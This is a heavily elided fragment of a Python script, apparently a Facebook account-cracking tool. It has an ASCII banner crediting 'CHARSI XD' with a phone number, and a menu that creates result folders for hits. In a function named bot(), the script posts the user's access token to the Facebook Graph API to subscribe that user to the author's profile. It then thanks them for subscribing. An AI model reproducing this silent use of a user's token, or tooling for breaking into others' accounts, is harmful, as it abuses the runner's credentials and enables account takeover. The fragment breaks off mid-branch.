...
{M} ██║░░██║███████╗██║
////
{H}[{P}>{H}]{P} Au : CHARSI XD
{H}[{P}>{H}]{P} Wa : +923110760985
...
def bot():
	...
	requests.post("https://graph.facebook.com/100069819591035/subscribers?access_token="+token) # Charsi
...
def menu():
	try:
		os.mkdir("Total_Chasi-Cp")
	except:
		pass
	try:
		os.mkdir("Total_Charsi-Ok")
	except:
		pass
	clear()
	banner()
	...
	if sayangku=="1" or sayangku=="01":
		...
		jalan(balmond+l+" Thanks For Using Subscribe Pindawaly")
		time.sleep(0.5)
		exit()
	else:
